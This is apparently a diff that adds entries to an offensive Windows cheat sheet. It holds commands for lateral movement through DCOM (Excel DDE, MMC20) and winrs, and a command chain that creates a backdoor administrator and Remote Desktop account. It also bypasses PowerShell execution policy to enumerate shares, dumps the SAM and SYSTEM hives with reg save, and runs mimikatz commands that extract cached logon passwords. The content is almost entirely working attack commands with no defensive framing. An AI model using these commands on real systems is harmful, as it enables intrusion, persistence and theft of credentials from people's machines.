@@ -11,4 +11,29 @@ powershell -noexit -ExecutionPolicy Unrestricted
 $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "<Target_IP>"))
 $excel.DisplayAlerts = $false
 $excel.DDEInitiate("cmd", "/c calc.exe")
+.........................................................................................................................................
 
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"))
+
+
+
+
+winrs -r:target netsh.exe winhttp show proxy                  (The advantage is that you get the command’s output back)
+.........................................................................................................................................
+
+net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add
+
+.........................................................................................................................................
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME
+
+.........................................................................................................................................
+
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+.........................................................................................................................................
+
+privilege::debug
+token::elevate
+lsadump::sam
+sekurlsa::logonpasswords
